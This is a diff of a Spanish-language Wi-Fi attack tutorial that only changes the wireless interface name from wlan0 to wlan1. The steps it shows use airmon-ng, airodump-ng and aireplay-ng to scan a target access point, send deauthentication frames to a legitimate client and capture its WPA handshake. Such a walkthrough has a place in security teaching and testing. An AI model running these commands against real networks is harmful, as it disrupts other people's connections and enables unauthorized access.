@@ -252,17 +252,17 @@ sudo airmon-ng check kill
 sudo airmon-ng check
 ```
 
-Poner el dispositivo en modo monitor y comprobar que ha cambiado de nombre a "wlan0mon"
+Poner el dispositivo en modo monitor y comprobar que ha cambiado de nombre a "wlan1mon"
 
 ```
-sudo airmon-ng start wlan0
+sudo airmon-ng start wlan1
 iwconfig
 ```
 
 Escanear las redes públicas para obtener el BSSID del punto de acceso y su canal
 
 ```
-sudo airodump-ng wlan0mon
+sudo airodump-ng wlan1mon
 ```
 
 Volver a correr el comando, esta vez especificando ambos y un nombre para el output (archivos de salida) que nos servirán más adelante
@@ -270,7 +270,7 @@ Volver a correr el comando, esta vez especificando ambos y un nombre para el out
 ```
 cd
 cd Desktop
-sudo airodump-ng -c [canal] --bssid [bssid] -w objetivo wlan0mon
+sudo airodump-ng -c [canal] --bssid [bssid] -w objetivo wlan1mon
 ```
 
 En la parte inferior se muestran los dispositivos conectados al punto de acceso.
@@ -278,7 +278,7 @@ En la parte inferior se muestran los dispositivos conectados al punto de acceso.
 En otra pestaña del terminal, vamos a desautenticar alguno de los dispositivos legítimos lanzando "tramas de desautenticación". Usar la columna STATION del elegido y nuevamente el BSSID del punto de acceso
 
 ```
-sudo aireplay-ng -0 5 -a [bssid] -c [station] wlan0mon
+sudo aireplay-ng -0 5 -a [bssid] -c [station] wlan1mon
 ```
 
 La desautenticación del dispositivo es imperceptible y el mismo se reconectará automáticamente de forma inmediata pero habremos conseguido el deseado "4-Way Handshake". Comprobarlo en la otra pestaña del terminal "WPA handshake"
